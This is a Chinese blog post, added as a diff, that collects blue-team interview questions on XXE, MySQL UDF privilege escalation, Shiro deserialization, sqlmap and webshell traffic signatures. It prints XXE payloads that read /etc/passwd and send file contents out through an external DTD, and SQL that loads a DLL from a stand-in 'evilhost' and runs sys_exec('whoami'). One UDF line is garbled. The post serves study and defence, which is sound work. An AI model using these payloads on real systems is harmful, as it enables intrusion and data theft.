@@ -1,0 +1,880 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>hvv-question | wd-z711&#39;s B10g</title>
+  <meta name="author" content="wd-z711">
+  
+  <meta name="description" content="Common student in China. Interested in web &amp; re.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="hvv-question"/>
+  <meta property="og:site_name" content="wd-z711&#39;s B10g"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'G-YHJSKZDC3Y', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="wd-z711's B10g" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">wd-z711&#39;s B10g</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> hvv-question</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="HVV蓝队问题总结"><a href="#HVV蓝队问题总结" class="headerlink" title="HVV蓝队问题总结"></a>HVV蓝队问题总结</h1><p>初级面试题：<a target="_blank" rel="noopener" href="http://cn-sec.com/archives/1120870.html">http://cn-sec.com/archives/1120870.html</a></p>
+<p>中级面试题：<a target="_blank" rel="noopener" href="https://www.moonsec.com/5661.html">https://www.moonsec.com/5661.html</a></p>
+<p>其他面试题链接：</p>
+<p>（1）<a target="_blank" rel="noopener" href="https://www.wangan.com/p/7fy78403bdf27404">https://www.wangan.com/p/7fy78403bdf27404</a></p>
+<p>（2）<a target="_blank" rel="noopener" href="http://www.tlcement.com/27237.html">http://www.tlcement.com/27237.html</a></p>
+<p>（3）<a target="_blank" rel="noopener" href="http://www.tlcement.com/35044.html">http://www.tlcement.com/35044.html</a></p>
+<span id="more"></span>
+<h1 id="XXE漏洞的原理，使用的协议和危害"><a href="#XXE漏洞的原理，使用的协议和危害" class="headerlink" title="XXE漏洞的原理，使用的协议和危害"></a>XXE漏洞的原理，使用的协议和危害</h1><ul>
+<li>XML External Entity Injection XML外部实体注入</li>
+<li>如果一个接口支持接收XML数据，且没有对XML数据做任何方面的措施就可能导致XXE漏洞。外部引用可以支持http、file和FTP等协议</li>
+</ul>
+<p>危害：<br>(1)读取任意文件 (2)利用支持的协议执行系统命令 (3)探测内网端口</p>
+<h2 id="我的理解"><a href="#我的理解" class="headerlink" title="我的理解"></a>我的理解</h2><h3 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h3><p>也就是服务器上能直接输出结果的</p>
+<ul>
+<li>比如服务器上有一个xml.php，代码如下：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">xml.php</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">libxml_disable_entity_loader</span> (<span class="literal">false</span>);</span><br><span class="line">    <span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$creds</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h4><ul>
+<li>传入下面的payload</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">creds</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">goodies</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/system.ini&quot;</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span><span class="symbol">&amp;goodies;</span><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>相当于在解析XML文件时，执行了goodies中的语句，读取了配置文件，有点像sql注入</li>
+</ul>
+<h4 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h4><ul>
+<li>通过DTD文档引入外部DTD文档，再引入外部实体声明</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a <span class="keyword">SYSTEM</span> <span class="string">&quot;http://localhost/evil.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">abc</span>&gt;</span><span class="symbol">&amp;b;</span><span class="tag">&lt;/<span class="name">abc</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>evil.dtd内容：</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY b <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><h4 id="方法1-1"><a href="#方法1-1" class="headerlink" title="方法1"></a>方法1</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c://test/1.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://localhost/evil.xml&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">%dtd; %all; </span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">abc</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">abc</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>其中evil.xml文件内容为:</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">all</span> <span class="string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://localhost%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>调用过程为：参数实体dtd调用外部实体evil.xml，然后又调用参数实体all，接着调用实体send。</li>
+<li>上述过程是一个<strong>参数外带</strong>的过程</li>
+</ul>
+<h4 id="方法2-1"><a href="#方法2-1" class="headerlink" title="方法2"></a>方法2</h4><p>第二种无回显payload写法：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line">    <span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/convert.base64-encode/resource=c:/test/1.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://localhost/evil.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %dtd;</span></span><br><span class="line"><span class="meta">    %send;</span></span><br><span class="line"><span class="meta">    ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">abc</span>&gt;</span><span class="tag">&lt;/<span class="name">abc</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>其中evil.xml文件内容为：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">payload</span> <span class="string">&quot;&lt;!ENTITY % send SYSTEM &#x27;http://localhost/?content=%file;&#x27;&gt;&quot;</span>&gt;</span> %payload;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>调用过程和第一种方法类似，但最里层的嵌套里%要进行实体编码成%。无报错需要访问接受数据的服务器中的日志信息，可以看到经过base64编码过的数据，解码后便可以得到数据。</li>
+</ul>
+<h1 id="对称加密和非对称加密"><a href="#对称加密和非对称加密" class="headerlink" title="对称加密和非对称加密"></a>对称加密和非对称加密</h1><ul>
+<li>对称加密算法在加密和解密时使用的是同一个秘钥；</li>
+<li>而非对称加密算法需要两个密钥来进行加密和解密，这两个密钥是公开密钥（public key，简称公钥）和私有密钥（private key，简称私钥）。</li>
+</ul>
+<h2 id="对称加密："><a href="#对称加密：" class="headerlink" title="对称加密："></a>对称加密：</h2><ul>
+<li>优点：算法简单，加密解密容易，效率高，执行快。</li>
+<li>缺点：相对来说不算特别安全，只有一把钥匙，密文如果被拦截，且密钥也被劫持，那么，信息很容易被破译。</li>
+<li>常见的对称加密算法：DES，AES，3DES等等。</li>
+</ul>
+<h2 id="非对称加密："><a href="#非对称加密：" class="headerlink" title="非对称加密："></a>非对称加密：</h2><ul>
+<li>优点：安全，即使密文被拦截、公钥被获取，但是无法获取到私钥，也就无法破译密文。作为接收方，务必要保管好自己的密钥。</li>
+<li>缺点：加密算法及其复杂，安全性依赖算法与密钥，而且加密和解密效率很低</li>
+<li>常见的非对称加密算法：RSA，ECC</li>
+</ul>
+<h1 id="mysql如何进行提权？"><a href="#mysql如何进行提权？" class="headerlink" title="mysql如何进行提权？"></a>mysql如何进行提权？</h1><p>&emsp;在MySQL中进行提权的一种常见方法是利用用户定义函数（User-Defined Function，UDF）漏洞。这个漏洞可以允许攻击者通过上传和执行恶意UDF来获取系统级别的权限，从而进行提权攻击。</p>
+<p>以下是一些常见的利用UDF漏洞进行提权的方法：</p>
+<ol>
+<li>利用已知的UDF漏洞：攻击者可以利用已知的UDF漏洞来上传和执行恶意UDF，从而获取系统级别的权限。例如，MySQL 5.1.41版本中存在一个UDF漏洞，攻击者可以利用这个漏洞来上传和执行恶意UDF。</li>
+<li>自己编写UDF：攻击者可以自己编写UDF来上传和执行恶意代码，从而获取系统级别的权限。例如，攻击者可以编写一个UDF，利用系统漏洞来修改管理员密码，从而获取管理员权限。</li>
+<li>利用已知的系统漏洞：攻击者可以利用已知的系统漏洞来上传和执行恶意代码，从而获取系统级别的权限。例如，攻击者可以利用Web应用程序中的文件上传漏洞来上传恶意UDF。</li>
+</ol>
+<p>&emsp;为了防止MySQL提权攻击，请遵循以下最佳实践：</p>
+<ol>
+<li>及时更新MySQL版本，以修复已知的漏洞。</li>
+<li>禁用不必要的功能，例如UDF和插件等。</li>
+<li>配置MySQL安全参数，例如限制MySQL用户的权限、限制外部访问、启用SSL等。</li>
+<li>定期进行安全审计和漏洞扫描，及时发现和修复漏洞。</li>
+<li>对Web应用程序进行安全测试和代码审计，及时发现和修复漏洞。</li>
+</ol>
+<h1 id="mysql-的udf提权：原理"><a href="#mysql-的udf提权：原理" class="headerlink" title="mysql 的udf提权：原理"></a>mysql 的udf提权：原理</h1><ul>
+<li>一种提权方式，把大佬写好的代码通过load_file的方式加载进去</li>
+<li>这个代码里面有很多函数，如sys_eval(‘whoami’)可以执行系统命令</li>
+</ul>
+<h2 id="什么是-UDF"><a href="#什么是-UDF" class="headerlink" title="什么是 UDF"></a>什么是 UDF</h2><ul>
+<li>那么什么是 UDF ？ 全称是 User defined function(用户自定义函数)，一听这个名字就知道我的基础权限要求还是很高的，要求数据库 root 权限</li>
+<li>当我们有读取和写入权限以后，我们就可以尝试使用 udf 提权的方法，从数据库的 root 权限提升到 系统的管理员权限</li>
+</ul>
+<h2 id="放在哪里"><a href="#放在哪里" class="headerlink" title="放在哪里"></a>放在哪里</h2><ul>
+<li>因为叫 UDF 于是我们能编写自己的 DLL 然后让 mysql 调用，实现我们自定义的命令</li>
+<li>当 MySQL&lt; 5.1 版本时，将 .dll 文件导入到 c:\windows 或者 c:\windows\system32 目录下。</li>
+<li>当 MySQL&gt; 5.1 版本时，UDF库必须包含在plugin文件夹中，可以使用‘@@plugin_dir’全局变量找到它。这个变量可以在mysql.ini文件中看到和编辑。</li>
+</ul>
+<p><img src="/images/hvv-question/1678695684756-f26607da-d833-4940-8eca-38c2bb2b20d2.png" alt="img" style="zoom:80%;" /></p>
+<h2 id="怎么放进去"><a href="#怎么放进去" class="headerlink" title="怎么放进去"></a>怎么放进去</h2><h3 id="方法一：远程加载"><a href="#方法一：远程加载" class="headerlink" title="方法一：远程加载"></a>方法一：远程加载</h3><ul>
+<li>load_file() 函数支持远程加载，然后我们配合 dumpfile 实现写入</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> load_file(<span class="string">&#x27;\\\\evilhost\evil.dll&#x27;</span>) <span class="keyword">into</span> dumpfile &quot;E:\\phpstudy\\PHPTutorial\\MySQL\\select load_file(&#x27;\\\\evilhost\evil.dll&#x27;) into dumpfile &quot;E:\\phpstudy\\PHPTutorial\\MySQL\\<span class="keyword">select</span> load_file(<span class="string">&#x27;\\\\evilhost\evil.dll&#x27;</span>) <span class="keyword">into</span> dumpfile &quot;E:\\phpstudy\\PHPTutorial\\MySQL\\lib\\plugin\\udf.dll&quot;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>dumpfile函数可以把查询的结果写入到文件中</li>
+</ul>
+<h3 id="方法二：hex写入"><a href="#方法二：hex写入" class="headerlink" title="方法二：hex写入"></a>方法二：hex写入</h3><ul>
+<li>就是转成16进制写</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> hex(load_file(<span class="string">&#x27;E:\\lib_mysqludf_sys_64.dll&#x27;</span>)) <span class="keyword">into</span> outfile &quot;E:\\udf64.hex&quot;；</span><br></pre></td></tr></table></figure>
+<ul>
+<li>上面这个lib_mysqludf_sys_64.dll的地址是MSF提供的</li>
+</ul>
+<h2 id="放进去之后咋用"><a href="#放进去之后咋用" class="headerlink" title="放进去之后咋用"></a>放进去之后咋用</h2><ul>
+<li>在 udf.dll 文件中，我义了名为 sys_eval() 的 MySQL 函数，该函数可以执行系统任意命令</li>
+<li>可以这样：创建一个名为sys_exec的函数，它返回一个整数值，它的实现是从一个名为udf.dll的动态链接库（DLL）文件中加载的。</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> sys_exec <span class="keyword">RETURNS</span> <span class="type">int</span> soname <span class="string">&#x27;udf.dll&#x27;</span> </span><br></pre></td></tr></table></figure>
+<ul>
+<li>也可以这样：查看创建的sys_exec，也可以用sys_eval函数</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.func <span class="keyword">where</span> name <span class="operator">=</span> &quot;sys_exec&quot;;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>命令执行</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sys_exec(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="两种方式进行-UDF的提权："><a href="#两种方式进行-UDF的提权：" class="headerlink" title="两种方式进行 UDF的提权："></a>两种方式进行 UDF的提权：</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><ul>
+<li>通过大马(<strong>这个指的是MSF</strong>?)的MySQL提权功能，成功导出 udf.dll 文件后，我们就可以直接在命令框输入 cmd 命令，来执行提权操作。注：在此之前，我们应执行版本查看语句，来确认当前MySQL的版本信息！</li>
+</ul>
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>直接在目标服务器上传 udf.php 此类的提权脚本提权。</p>
+<h1 id="UDF提权的利用条件"><a href="#UDF提权的利用条件" class="headerlink" title="UDF提权的利用条件"></a>UDF提权的利用条件</h1><ul>
+<li>MySQL数据库没有开启安全模式。</li>
+<li>已知的数据库账号具有对MySQL数据库insert和delete的权限，最好是root最高权限。</li>
+<li>shell有写入到数据库安装目录的权限。</li>
+<li>知道绝对路径</li>
+</ul>
+<h1 id="JAVA-实现RCE漏洞的函数"><a href="#JAVA-实现RCE漏洞的函数" class="headerlink" title="JAVA 实现RCE漏洞的函数"></a>JAVA 实现RCE漏洞的函数</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getruntieme.exec(<span class="string">&quot;cmd&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>().start(<span class="string">&quot;cmd&quot;</span>)</span><br></pre></td></tr></table></figure>
+<h1 id="shiro反序列化有了解过吗-一般是哪两种类型"><a href="#shiro反序列化有了解过吗-一般是哪两种类型" class="headerlink" title="shiro反序列化有了解过吗,一般是哪两种类型?"></a>shiro反序列化有了解过吗,一般是哪两种类型?</h1><ul>
+<li>Shiro反序列化是指一种利用Shiro框架的记住密码功能（RememberMe）造成的远程代码执行漏洞。</li>
+<li>Shiro框架会将用户的持久化信息序列化并加密后保存在Cookie的rememberMe字段中，下次读取时进行解密再反序列化。</li>
+<li>由于Shiro在反序列化时没有进行任何过滤，攻击者可以构造恶意的rememberMe值，触发任意代码执行。这个漏洞分为两种情况：</li>
+<li>Shiro版本小于1.2.4时，使用了默认的AES密钥（kPH+bIxk5D2deZiIxcaaaA==），攻击者可以直接利用这个密钥生成恶意的rememberMe值3456。</li>
+<li>Shiro版本大于等于1.2.4时，使用了自定义的AES密钥，攻击者需要先获取这个密钥才能利用这个漏洞</li>
+</ul>
+<p>一般是<strong>shiro550和shiro721</strong></p>
+<h2 id="shiro550和shiro721"><a href="#shiro550和shiro721" class="headerlink" title="shiro550和shiro721"></a>shiro550和shiro721</h2><ul>
+<li>Shiro550原理： Shiro组件会将前端的cookie中的RememberMe参数进行AES 及Base64解密，然后将其反序列化。 <strong>因此可以构造恶意的</strong>r<strong>ememberMe值，触发任意代码执行。</strong></li>
+<li>Shiro721原理： 由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行 </li>
+</ul>
+<blockquote>
+<ul>
+<li>Padding Oracle Attack是一种利用密码算法中的CBC模式的漏洞，通过观察密文的填充验证信息来逐字节解密密文或者构造合法密文的攻击方法。这种攻击不需要知道密钥，只需要一个能够返回填充是否正确的提示（Oracle）就可以进行</li>
+</ul>
+</blockquote>
+<h1 id="网络设备有使用过吗-防火墙-路由器-交换机"><a href="#网络设备有使用过吗-防火墙-路由器-交换机" class="headerlink" title="网络设备有使用过吗,防火墙,路由器,交换机"></a>网络设备有使用过吗,防火墙,路由器,交换机</h1><ul>
+<li>交换机负责连接网络设备（如交换机、路由器、防火墙、无线AP等）和终端设备（如计算机、服务器、摄像头、网络打印机等）；</li>
+<li>路由器实现局域网与局域网的互联，局域网与Internet的互联；</li>
+<li>而防火墙作为一个安全网络设备，作用于内部网络与内部网络之间，或者内部网络与Internet之间。</li>
+<li>总结，<strong>交换机负责连接设备，路由器负责连接网络，防火墙负责网络访问限制。</strong></li>
+</ul>
+<h1 id="态势感知有了解过吗"><a href="#态势感知有了解过吗" class="headerlink" title="态势感知有了解过吗?"></a>态势感知有了解过吗?</h1><ul>
+<li>态势感知是基于网络环境、动态的、整体的洞悉网络安全风险，以安全大数据为基础，以企业的业务为核心，进行实时的异常检测，实现安全分析智能化与威胁可视化，并提供威胁情报共享、安全态势感知和高级威胁侦测分析等服务。</li>
+</ul>
+<h1 id="拿到一个网站-如何做渗透-渗透流程"><a href="#拿到一个网站-如何做渗透-渗透流程" class="headerlink" title="拿到一个网站,如何做渗透,渗透流程?"></a>拿到一个网站,如何做渗透,渗透流程?</h1><p>信息收集、漏洞扫描、漏洞验证、漏洞利用、权限提升、权限维持、痕迹清理、内网渗透等。</p>
+<h1 id="sqlmap的命令说一下，sqlmap需要一些脚本绕过操作-有写过脚本吗"><a href="#sqlmap的命令说一下，sqlmap需要一些脚本绕过操作-有写过脚本吗" class="headerlink" title="sqlmap的命令说一下，sqlmap需要一些脚本绕过操作,有写过脚本吗?"></a>sqlmap的命令说一下，sqlmap需要一些脚本绕过操作,有写过脚本吗?</h1><ul>
+<li>参数：</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">-</span>u URL </span><br><span class="line"><span class="operator">-</span>v 输出日志 查看详细的测试信息，后面可以跟数字，从<span class="number">1</span><span class="number">-6</span></span><br><span class="line"><span class="operator">-</span>r 读取文件 </span><br><span class="line"><span class="comment">--random-agent随机UA</span></span><br><span class="line"><span class="comment">--dbs获取所有数据库</span></span><br><span class="line"><span class="comment">--cookie指定cookie</span></span><br><span class="line"><span class="comment">--level 2 指定测试范围 2可以测试cookie </span></span><br><span class="line"><span class="comment">--data= 指定post请求参数 </span></span><br><span class="line"><span class="comment">--batch 默认设置</span></span><br><span class="line"><span class="comment">--risk 3 设置威胁级别</span></span><br><span class="line"><span class="comment">--technique= 指定测试的注入类型</span></span><br><span class="line"><span class="operator">-</span>g 代入google查询</span><br><span class="line"><span class="operator">-</span>p 指定测试的参数</span><br></pre></td></tr></table></figure>
+<ul>
+<li>脚本绕过操作：sqlmap脚本绕过是指使用sqlmap提供的tamper参数，调用一些内置的或自定义的脚本，对注入的数据进行修改或编码，从而绕过一些防火墙或WAF等设备。</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u “http:<span class="operator">/</span><span class="operator">/</span>www.example.com<span class="operator">/</span>index.php?id<span class="operator">=</span><span class="number">1</span>” <span class="comment">--tamper base64encode.py</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>就是对注入的数据进行base64编码，用系统默认的base64encode脚本</li>
+</ul>
+<h1 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h1><p>比如中国菜刀：<br>比如PHP后门的特性：</p>
+<ul>
+<li>第一：”eval”，eval函数用于执行传递的攻击payload，这是必不可少的；</li>
+<li>第二：(base64<em>decode</em>$_POST[z0])，将攻击payload进行Base64解码，因为菜刀默认是将攻击载荷使用Base64编码</li>
+<li>第三：&amp;z0=QGluaV9zZXQ…，该部分是传递攻击payload，此参数z0对应$_POST[z0]接收到的数据，该参数值是使用Base64编码的，所以可以利用base64解码可以看到攻击明文</li>
+</ul>
+<h1 id="简单说一下冰蝎的2-0和3-0的特征"><a href="#简单说一下冰蝎的2-0和3-0的特征" class="headerlink" title="简单说一下冰蝎的2.0和3.0的特征?"></a>简单说一下冰蝎的2.0和3.0的特征?</h1><ul>
+<li>冰蝎是一款基于Java开发的动态加密通信流量的新型Webshell客户端。它可以用来管理被上传了Webshell的网站，具有基本信息、命令执行、虚拟终端、文件管理、Socks代理、反弹shell、数据库管理、自定义代码等功能34。</li>
+<li>它使用<strong>AES加密算法对流量进行加密</strong>，避免被安全设备检测。</li>
+</ul>
+<h2 id="冰蝎的2-0："><a href="#冰蝎的2-0：" class="headerlink" title="冰蝎的2.0："></a>冰蝎的2.0：</h2><p>●二次密钥协商<br>●accept字段:字段很特殊： text/html, image/gif, image/jpeg, *; q=.2, <em>/</em>; q=.2<br>●UA字段：默认内置十多个<br>●Content-length ：16</p>
+<h2 id="冰蝎的3-0"><a href="#冰蝎的3-0" class="headerlink" title="冰蝎的3.0"></a>冰蝎的3.0</h2><p>●预共享密钥<br>●user-agent：内置20多个<br>●accept：字段特殊<br>●content-type: text/html;charset=utf-8<br>Content-Length和Cookie也可以作为特征，只是长度不同情况不一样，Cookie不一定有特征字符串。</p>
+<h1 id="像这种抓包中-大多数情况下态势感知会对流量监控-如果有文件上传或者其他漏洞报警-如何判定报警是否为误报"><a href="#像这种抓包中-大多数情况下态势感知会对流量监控-如果有文件上传或者其他漏洞报警-如何判定报警是否为误报" class="headerlink" title="像这种抓包中,大多数情况下态势感知会对流量监控,如果有文件上传或者其他漏洞报警,如何判定报警是否为误报?"></a>像这种抓包中,大多数情况下态势感知会对流量监控,如果有文件上传或者其他漏洞报警,如何判定报警是否为误报?</h1><ul>
+<li>态势感知之所以报有威胁肯定是匹配到特征库了,当安全设备检测到来自外部或内部的「攻击尝试行为」就会触发告警，需要对告警日志进行研判分析，从其中找出「真实有效」的攻击事件。</li>
+<li>攻击方尝试利用现成的「EXP&amp;POC集成脚本工具」对资产目标进行检测扫描，安全设备检测到「攻击尝试行为」中的攻击特征就会产生告警。</li>
+<li>在通常情况下，可以把告警中的URL的“网页状态码”、<strong>“页面回显数据”</strong>作为「误报告警」判断的条件</li>
+</ul>
